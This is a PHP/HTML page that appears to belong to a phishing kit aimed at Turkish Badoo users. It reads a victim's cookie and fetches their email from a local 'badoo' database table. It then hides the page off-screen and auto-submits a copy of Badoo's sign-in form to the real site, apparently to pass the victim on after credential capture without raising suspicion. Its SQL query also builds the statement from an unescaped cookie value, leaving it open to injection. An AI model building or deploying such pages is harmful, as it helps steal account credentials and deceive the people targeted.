<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `badoo` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["signInForm"].submit();}</script>



<form id="signInForm" action="https://badoo.com/tr/signin/" method="post" class="autoloader" novalidate="">  <input type="hidden" name="rt" value="4c9cd5"> <div class="registration_head"></div> <div class="form_fields"> <div class="input">   <label for="email">Eposta adresi</label>    <div><input type="email" name="email" id="email" class="autofocus" value="<?=$email;?>"></div> </div> <div class="input"> <label for="password">Şifre </label>   <div><input type="password" name="password" id="password" value=""></div> </div>  <div class="input remember"> <input type="checkbox" id="remember" name="remember" value="1" checked="checked"> <label for="remember">Beni hatırla</label> </div>  <div class="rest_input sign_in"> <button type="submit" name="post">İçeriye girmek istiyorum!</button>  <ins class="loading_to_button ltb_sign_in"><span class="waiting"></span></ins> <span class="for_forgot"> <a href="http://badoo.com/tr/forgot/?email=">Şifreni mi unuttun?</a> </span> </div> <div class="agreement"> Devam ederek, <a target="_blank" href="http://badoo.com/tr/terms/">Kurallar ve Koşullarımızı</a> <a target="_blank" href="http://badoo.com/tr/privacy/">Gizlilik Politikamızı</a> <a target="_blank" href="http://badoo.com/tr/privacy/#cookies">Çerezler Politikamızı</a>kabul etmiş oluyorsun.. </div> </div> <div class="formfade"></div> </form>



</body>
</html>

